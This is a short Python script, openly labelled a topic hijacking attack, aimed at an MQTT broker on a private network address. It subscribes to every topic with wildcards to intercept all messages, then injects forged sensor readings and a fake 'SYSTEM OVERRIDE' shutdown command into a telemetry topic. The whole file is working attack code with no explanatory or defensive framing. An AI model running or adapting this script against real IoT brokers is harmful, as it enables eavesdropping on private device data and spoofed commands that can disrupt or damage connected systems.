import paho.mqtt.client as mqtt
import time

BROKER = "192.168.35.143"
PORT = 1883

intercepted = []

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("[+] Connected to broker successfully")
        client.subscribe("#")
        client.subscribe("+/+")
        print("[*] Subscribed to ALL topics using wildcards # and +/+")
    else:
        print(f"[-] Connection failed: {rc}")

def on_message(client, userdata, msg):
    intercepted.append(msg)
    print(f"[INTERCEPTED] Topic: {msg.topic} | Payload: {msg.payload.decode()}")

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(BROKER, PORT, 60)
client.loop_start()

print("[*] Starting Topic Hijacking Attack")
print("[*] Phase 1 — Intercepting all topics for 20 seconds...")
time.sleep(20)

print("\n[*] Phase 2 — Injecting fake malicious messages...")
fake_payloads = [
    '{"temperature": 999.9, "humidity": 999.9}',
    '{"temperature": -99.9, "humidity": 0.0}',
    '{"alert": "SYSTEM OVERRIDE", "cmd": "shutdown"}',
    '{"temperature": 150.0, "humidity": 100.0}',
    '{"malicious": true, "source": "attacker"}',
]

for payload in fake_payloads:
    client.publish("sensors/telemetry", payload)
    print(f"[INJECTED] sensors/telemetry <- {payload}")
    time.sleep(2)

print(f"\n[*] Total messages intercepted: {len(intercepted)}")
print("[*] Topic hijacking complete")
client.loop_stop()